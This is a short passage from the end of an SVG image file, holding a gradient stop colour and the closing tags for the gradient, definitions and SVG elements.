stop-color="#9F762B"/></linearGradient></defs></svg>